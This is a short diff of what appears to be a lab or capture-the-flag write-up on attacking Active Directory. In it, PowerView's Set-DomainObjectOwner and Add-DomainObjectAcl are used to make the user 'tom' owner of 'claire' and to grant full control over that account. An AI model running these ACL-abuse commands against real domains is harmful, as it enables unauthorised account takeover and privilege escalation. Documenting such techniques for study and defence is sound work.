@@ -490,7 +490,9 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity 'claire' -OwnerIdentity 'tom'
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "claire" -PrincipalIdentity "tom"
 ```
-This imported power
+This imported powerview which was conveniently already there for me, then made `tom` the owner of `claire` from there i could give myself full control over `claire`
+
+
 
 
 
